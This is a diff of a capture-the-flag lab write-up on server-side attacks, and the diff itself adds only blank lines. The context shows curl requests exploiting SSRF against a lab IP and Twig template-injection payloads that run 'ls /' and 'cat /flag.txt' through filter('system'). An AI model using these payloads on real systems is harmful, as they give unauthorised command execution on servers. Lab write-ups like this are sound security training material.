@@ -30,6 +30,7 @@ e: application/x-www-form-urlencoded"   
 ```
 
 We can attempt to exploit a SSRF which has done successfully but we cannot achieve RCE or find interesting data with LFI
+
 ```shell
 curl -X POST http://154.57.164.64:30160   -d 'api=http://127.1:80' -H "Content-Type: application/x-www-for  
 m-urlencoded"     
@@ -43,6 +44,7 @@ m-urlencoded"   
 
 
 Testing further we can realise that any input we introduced within the id parameter will be reflected in the server response, that means that we can try some injections
+
 ```shell
  curl -X POST http://154.57.164.64:30160   -d 'api=http://truckapi.htb/?id=testing' -H "Content-Type: appli  
 cation/x-www-form-urlencoded"     
@@ -69,6 +71,7 @@ After getting **49** using the payload `{{7*7}}` we can sightly confirm that the
 
 
 Then I searched in the _/_ directory looking for the _flag.txt_ file
+
 ```twig
 {{ ['ls /'] | filter('system') }}
 ```
@@ -76,6 +79,7 @@ Then I searched in the _/_ directory looking for the _flag.txt_ file
 ![](/assets/img/Anexos/Server%20Side%20Attacks%20Skills%20Assessments-4.png)
 
 Finally we can reed the flag:
+
 ```twig
 {{ ['cat /flag.txt'] | filter('system') }}
 ```
